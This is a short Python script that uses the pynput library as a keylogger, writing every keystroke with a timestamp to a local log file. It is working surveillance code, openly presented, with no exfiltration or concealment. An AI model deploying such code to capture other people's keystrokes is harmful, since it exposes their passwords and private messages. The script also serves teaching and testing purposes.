#Pynput Library 
from pynput.keyboard import Key, Listener
#Vanilla python
import logging

#Make a log file 
log_dir = ""

logging.basicConfig(filename=(log_dir + "Key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))
    #if key == Key.esc:
        #return false

with Listener(on_press=on_press) as Listener:
     Listener.join()
